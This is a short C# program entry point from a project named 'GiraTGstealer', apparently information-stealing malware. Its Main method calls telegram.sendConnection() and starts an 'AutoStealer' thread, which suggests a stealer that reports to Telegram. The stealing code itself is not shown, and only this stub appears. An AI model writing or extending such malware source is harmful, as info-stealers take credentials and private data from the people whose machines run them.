using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace GiraTGstealer
{
    internal class Program
    {
        static void Main(string[] args)
        {
            telegram.sendConnection();
            AutoStealer.AutoStealerThread.Start();
            Console.ReadLine();
        }
    }
}
